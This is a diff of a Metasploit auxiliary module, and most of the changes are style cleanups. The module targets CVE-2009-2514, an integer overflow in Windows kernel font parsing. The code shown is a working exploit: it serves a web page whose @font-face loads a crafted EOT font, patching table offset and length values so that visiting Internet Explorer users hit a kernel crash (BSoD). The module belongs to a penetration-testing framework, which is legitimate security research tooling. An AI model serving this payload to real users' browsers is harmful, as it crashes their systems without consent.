@@ -7,31 +7,37 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
-      'Description'    => %q{
-        This module exploits an integer overflow flaw in the Microsoft Windows Embedded
-      OpenType font parsing code located in win32k.sys. Since the kernel itself parses
-      embedded web fonts, it is possible to trigger a BSoD from a normal web page when
-      viewed with Internet Explorer.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'hdm',
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft Windows EOT Font Table Directory Integer Overflow',
+        'Description' => %q{
+          This module exploits an integer overflow flaw in the Microsoft Windows Embedded
+          OpenType font parsing code located in win32k.sys. Since the kernel itself parses
+          embedded web fonts, it is possible to trigger a BSoD from a normal web page when
+          viewed with Internet Explorer.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'hdm',
+        'References' => [
           [ 'CVE', '2009-2514' ],
           [ 'MSB', 'MS09-065' ],
           [ 'OSVDB', '59869']
         ],
-      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
-      'PassiveActions' => [ 'WebServer' ],
-      'DefaultAction'  => 'WebServer',
-      'DisclosureDate' => '2009-11-10'
-    ))
+        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],
+        'PassiveActions' => [ 'WebServer' ],
+        'DefaultAction' => 'WebServer',
+        'DisclosureDate' => '2009-11-10',
+        'Notes' => {
+          'Stability' => [CRASH_OS_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
     register_options([
-      OptPath.new('EOTFILE', [ true, "The EOT template to use to generate the trigger", File.join(Msf::Config.data_directory, "exploits", "pricedown.eot")]),
+      OptPath.new('EOTFILE', [ true, 'The EOT template to use to generate the trigger', File.join(Msf::Config.data_directory, 'exploits', 'pricedown.eot')]),
     ])
-
   end
 
   def run
@@ -42,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
     @tag ||= Rex::Text.rand_text_alpha(8)
     @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']), mode: 'rb')
 
-    if(request.uri =~ /#{@tag}$/)
+    if (request.uri =~ /#{@tag}$/)
       content = @eot.dup
 
       # Only this table entry seems to trigger the bug
@@ -53,25 +59,25 @@ class MetasploitModule < Msf::Auxiliary
       clen = (0xfffffffe - coff + 0xcc)
 
       # Patch in the modified offset and length values
-      content[cidx + 8, 8] = [ coff, clen ].pack("N*")
+      content[cidx + 8, 8] = [ coff, clen ].pack('N*')
 
       # Send the font on its merry way
-      print_status("Sending embedded font...")
+      print_status('Sending embedded font...')
       send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })
     else
-      var_title = Rex::Text.rand_text_alpha(6 + rand(32))
-      var_body = Rex::Text.rand_text_alpha(64 + rand(32))
-      var_font = Rex::Text.rand_text_alpha(2 + rand(6))
-      var_face = Rex::Text.rand_text_alpha(2 + rand(32))
+      var_title = Rex::Text.rand_text_alpha(6..37)
+      var_body = Rex::Text.rand_text_alpha(64..95)
+      var_font = Rex::Text.rand_text_alpha(2..7)
+      var_face = Rex::Text.rand_text_alpha(2..33)
 
-      content = %Q|<html><head><title>#{var_title}</title><style type="text/css">
+      content = %|<html><head><title>#{var_title}</title><style type="text/css">
 @font-face{ font-family: '#{var_face}';  src: url('#{get_resource}/#{var_font}#{@tag}'); }
 body {
   font-family: '#{var_face}';
 }
 </style></head><body> #{var_body} </body></html>|
 
-      print_status("Sending HTML page with embedded font...")
+      print_status('Sending HTML page with embedded font...')
       send_response_html(cli, content, { 'Content-Type' => 'text/html' })
     end
   end
